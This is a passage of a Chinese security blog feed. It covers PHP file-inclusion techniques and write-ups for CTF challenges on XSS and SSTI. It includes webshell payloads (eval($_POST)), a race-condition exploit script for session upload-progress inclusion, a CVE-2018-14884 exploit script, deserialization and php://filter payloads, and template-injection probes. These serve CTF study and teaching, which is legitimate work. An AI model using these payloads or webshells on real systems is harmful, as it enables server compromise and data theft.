<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315214340393.png" alt loading="lazy"></p>
<h4 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h4><p>用法：<code>?a=phar://压缩包/内部文件 phar://xxx.png/shell.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php">2.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>

<p>注意： <code>PHP &gt; =5.3.0</code> 压缩包需要是<code>zip</code>协议压缩，<code>rar</code>不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 </p>
<p>步骤： 写一个一句话木马文件<code>shell.php</code>，然后用<code>zip</code>协议压缩为<code>shell.zip</code>，然后将后缀改为<code>png</code>等其他格式。 </p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315215247124.png" alt loading="lazy"></p>
<p>亦可写马</p>
<pre class="language-php" data-language="php"><code class="language-php">cmd=fputs(fopen('shell.php','w'),'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>');</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315215651827.png" alt loading="lazy"></p>
<h4 id="http-amp-https-伪协议"><a href="#http-amp-https-伪协议" class="headerlink" title="http:// &amp; https:// 伪协议"></a>http:// &amp; https:// 伪协议</h4><p><strong>条件</strong></p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
<p><strong>用法</strong></p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//example.com</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//example.com/file.php?var1=val1&amp;var2=val2</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//user:password@example.com</span></span>
<span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//example.com</span></span>
<span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//example.com/file.php?var1=val1&amp;var2=val2</span></span>
<span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//user:password@example.com</span></span></code></pre>

<h4 id="zip-amp-bzip2-amp-zlib-伪协议"><a href="#zip-amp-bzip2-amp-zlib-伪协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://伪协议"></a>zip:// &amp; bzip2:// &amp; zlib://伪协议</h4><p><strong>条件</strong></p>
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code> :off/on</li>
</ul>
<p><strong>用法</strong></p>
<p><code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>
<ol>
<li><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</li>
<li><code>compress.bzip2://file.bz2</code>   压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</li>
<li><code>compress.zlib://file.gz</code>   压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</li>
</ol>
<p><strong>演示</strong></p>
<pre class="language-php" data-language="php"><code class="language-php">2.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>

<p>用法：<code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</code></p>
<p>条件： PHP &gt; =5.3.0， #在浏览器中要编码为%23</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315220043657.png" alt loading="lazy"></p>
<p>亦可与上面的一样就行写马操作</p>
<h3 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h3><h4 id="LFI-Session"><a href="#LFI-Session" class="headerlink" title="LFI Session"></a>LFI Session</h4><p>index.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$file</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>session.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>写session文件马：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210429183118771.png" alt loading="lazy"></p>
<p>包含session文件，成功命令执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210429183226742.png" alt loading="lazy"></p>
<p>本地配置如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210429181916866.png" alt loading="lazy"></p>
<ul>
<li><strong>session.auto_start</strong>：在php接收请求的时候自动初始化Session，不需要再执行<code>session_start()</code>，默认情况下关闭。</li>
<li><strong>session.save_path</strong>：Session存储的位置，我这里就是<code>D:\phpstudy\Extensions\tmp\tmp</code>。</li>
<li><strong>session.serialize_handler</strong>： <ul>
<li><strong>php</strong>：一直都在(默认方式)  它是用 |分割。</li>
<li><strong>php_serialize</strong> ：php5.5之后启用 它是用serialize反序列化格式分割。</li>
</ul>
</li>
<li><strong>session.use_strict_mode</strong>：默认为0，用户可以自己定义<code>Session ID</code>。比如，我们在Cookie里设置<code>PHPSESSID=flag</code>，PHP将会在服务器上创建一个文件：<code>sess_flag</code>。</li>
<li><strong>session.upload_progress</strong>：php&gt;=5.4添加的。最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中（包含用户可控的值），即使此时用户没有初始化Session，PHP也会自动初始化Session。 而且，默认情况下session.upload_progress.enabled是为On的，也就是说这个特性默认开启。</li>
<li><strong>session.upload_progress.enabled</strong>：默认开启，表示<code>upload_progress</code>功能开始，php能在每一个文件上传时监测上传进度，这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</li>
<li><strong>session.upload_progress.cleanup</strong>：默认开启这个选项，表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要。</li>
<li><strong>session.upload_progress.prefix</strong>与<strong>session.upload_progress.name</strong>：当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>变量同名（<code>PHP_SESSION_UPLOAD_PROGRESS</code>）时（这部分数据用户可控），上传进度可以在SESSION中获得。当PHP检测到这种POST请求时，它会在SESSION中添加一组数据（系统自动初始化session）, 索引是<code>session.upload_progress.prefix</code>与<code>session.upload_progress.name</code>连接在一起的值。</li>
<li><strong>session.upload_progress.freq **与</strong>session.upload_progress.min_freq**：选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。</li>
</ul>
<h4 id="NO-session-start"><a href="#NO-session-start" class="headerlink" title="NO session_start()"></a>NO session_start()</h4><p>在没有<code>session_start()</code>的时候，就该利用5.4后的新功能<code>upload_progress</code>来进行操作了</p>
<p><a href="http://php.net/manual/zh/session.upload-progress.php">PHP_SESSION_UPLOAD_PROGRESS的官方手册</a></p>
<p>在session中部分数据(<code>session.upload_progress.name</code>)是用户自己可以控制的。那么我们只需要在上传文件的过程中，在Cookie中设置PHPSESSID=flag（默认情况下用户可以自定义session ID），同时上传一个恶意的字段<code>PHP_SESSION_UPLOAD_PROGRESS</code>，只要上传包里带这个键，PHP就会自动启用Session，同时，我们在Cookie中设置了PHPSESSID=flag，所以Session会自动创建，但是有一个<code>session.upload_progress.cleanup</code>这个选项是默认开启的，此时就需要用条件竞争来利用。写脚本即可</p>
<p>exp：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> threading

sessid <span class="token operator">=</span> <span class="token string">'flag'</span>
url <span class="token operator">=</span> <span class="token string">'http://172.17.10.2:801/index.php'</span>

<span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>
        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
            url<span class="token punctuation">,</span>
            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('whoami');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span>
        <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">?file=../Extensions/tmp/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'extrader'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span></code></pre>

<p>得到结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210429195115800.png" alt loading="lazy"></p>
<p>当然也可以用<strong>burp</strong>的<strong>intruder</strong>模块进行操作</p>
<h3 id="利用php7-Segment-Fault特性"><a href="#利用php7-Segment-Fault特性" class="headerlink" title="利用php7_Segment_Fault特性"></a>利用php7_Segment_Fault特性</h3><p>CVE-2018-14884</p>
<blockquote>
<p>使用<code>php://filter/string.strip_tags</code>导致<code>php</code>崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个<code>tmp file</code>就会一直留在<code>tmp</code>目录，再进行文件名爆破就可以<code>getshell</code>。这个崩溃原因是存在一处空指针引用。</p>
<p>该方法仅适用于以下php7版本，php5并不存在该崩溃。</p>
</blockquote>
<p><strong>条件</strong></p>
<ul>
<li><code>php7.0.0-7.1.2</code>可以利用， <code>7.1.2x</code>版本的已被修复</li>
<li><code>php7.1.3-7.2.1</code>可以利用， <code>7.2.1x</code>版本的已被修复</li>
<li><code>php7.2.2-7.2.8</code>可以利用， <code>7.2.9-∞</code>到现在的版本已被修复</li>
</ul>
<p>Exp：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token comment">##BytesIO实现了在内存中读写bytes</span>
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
<span class="token keyword">import</span> re
payload <span class="token operator">=</span> <span class="token string">"&lt;?php eval($_POST[1]);?>"</span>
<span class="token comment">#BytesIO(payload.encode()).getvalue()</span>
data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
   <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
url<span class="token operator">=</span><span class="token string">"http://7b0dc85a-b370-4a5a-89ca-d2399fd4de31.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>data<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"fail!"</span><span class="token punctuation">)</span></code></pre>

<p>参考：<a href="https://www.shawroot.cc/1159.html">[NPUCTF2020]ezinclude（PHP临时文件包含）</a></p>
<h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="ZJCTF-2019-NiZhuanSiWei"></a>ZJCTF-2019-NiZhuanSiWei</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;h1>"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><code>file_get_contents</code>：将整个文件读入一个字符串</p>
<p>首先传入<code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>绕过第一个if</p>
<p>然后传入<code>file=php://filter/read=convert.base64-encode/resource=useless.php</code>读取<code>useless.php</code></p>
<p>base64解码后代码如下：</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php  

class Flag&#123;  &#x2F;&#x2F;flag.php  
    public $file;  
    public function __tostring()&#123;  
        if(isset($this-&gt;file))&#123;  
            echo file_get_contents($this-&gt;file); 
            echo &quot;&lt;br&gt;&quot;;
        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);
        &#125;  
    &#125;  
&#125;  
?&gt;  </code></pre>

<p>随后再传入<code>password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>，包含<code>file=useless.php</code>即可得到flag</p>
<p>完整payload：</p>
<pre class="language-none"><code class="language-none">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;
file&#x3D;useless.php
password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre>

<h4 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h4><p>请求<code>index.php?category=woofers&#39;</code>时得到<code>include</code>报错，并且<code>include</code>会字符串后面加上一个<code>.php</code></p>
<p>于是先用<code>php://filter</code>协议读一下<code>index.php</code>文件</p>
<p><code>php://filter/read=convert.base64-encode/resource=index</code>，解码得到入如下结果（舍去html元素）</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>                    
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"woofers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token keyword type-declaration">false</span> <span class="token operator">||</span> <span class="token class-name">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"meowers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token keyword type-declaration">false</span> <span class="token operator">||</span> <span class="token class-name">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>                        
            <span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                        
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Sorry, we currently only support woofers and meowers."</span><span class="token punctuation">;</span>                    
        <span class="token punctuation">&#125;</span>                
    <span class="token punctuation">&#125;</span>                
<span class="token delimiter important">?></span></span></code></pre>

<p>要求<code>category</code>必须携带<code>woofers</code>或者<code>meowers</code>才能进行<code>include</code>操作，那么加上去就可以了</p>
<p>payload：<code>php://filter/read=convert.base64-encode/resource=woofers/../flag</code></p>
<p>解码得到flag</p>
<p>网上还有一种说法就是<code>php://filter</code>伪协议可以套一层协议，也就是这样</p>
<p><code>php://filter/read=convert.base64-encode/woofers/resource=flag</code></p>
<p>这样提交的参数既包含有woofers这个字符串，也不会影响正常的包含</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><p><a href="https://www.freebuf.com/articles/web/182280.html">Web安全实战系列：文件包含漏洞</a></p>
</li>
<li><p><a href="https://www.leavesongs.com/search/?keyword=filter">谈一谈php://filter的妙用</a></p>
</li>
<li><p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a></p>
</li>
<li><p><a href="https://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-XSS</title>
    <url>/posts/fb2051a0/</url>
    <content><![CDATA[<h3 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h3><p>存在<code>.git</code>源码泄露，GitHack得到源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yds_is_so_beautiful'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>两行代码，根据题目名推测需要弹一个XSS弹窗，题目的代码没有类给我们构造反序列化条件，于是就需要利用<code>php</code>的原生类来进行操作</p>
<p>参考：<a href="http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/">php可利用的原生类</a></p>
<p>题目<code>php</code>版本是<code>5.6.40</code>，于是利用<code>Exception</code>类来进行弹窗</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>window.location.href='https://www.baidu.com'&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>抓包返回头中就有flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SSTI</title>
    <url>/posts/47d18edd/</url>
    <content><![CDATA[<p>先搬一张大佬的图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-20200521204901527.png" alt loading="lazy"></p>
<span id="more"></span>

<h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>打开链接发现就一个这东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-81.png" alt loading="lazy"></p>
<p>懵了，于是购买writeup进行学习：</p>
<p>发现该题是一个利用“Python SSTI”,“404模板注入”的原理</p>
<p>题目类型深度剖析移步大佬的文章：<a href="https://www.freebuf.com/column/187845.html">从零学习flask模板注入</a></p>
<p>方法：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">在Python的SSTI中，大部分是依靠基类-<span class="token operator">></span>子类-<span class="token operator">></span>危险函数的方式来利用SSTI

__class__  万物皆对象，而class用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<span class="token operator">&lt;</span>class <span class="token string">'str'</span><span class="token operator">></span>
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   以字符串返回一个类所直接继承的类。
__bases__  以元组的形式返回一个类所直接继承的类。
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表，获取类的所有子类。
__init__  类的初始化方法，所有自带带类都包含init方法，便于利用他当跳板来调用globals。
__globals__  对包含函数全局变量的字典的引用，用于获取function所处空间下可使用的module、方法以及所有变量。</code></pre>

<p>解题步骤：</p>
<p>1、测试是否存在SSTI：</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//111.198.29.45:46675/&#123;&#123;1+2&#125;&#125; </span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-82.png" alt loading="lazy"></p>
<p>事实证明存在SSTI</p>
<p>2、访问</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//111.198.29.45:46675/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span></span></code></pre>

<p>来查看所有模块</p>
<p>3、os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个（我眼瞎了，不要问我为什么）</p>
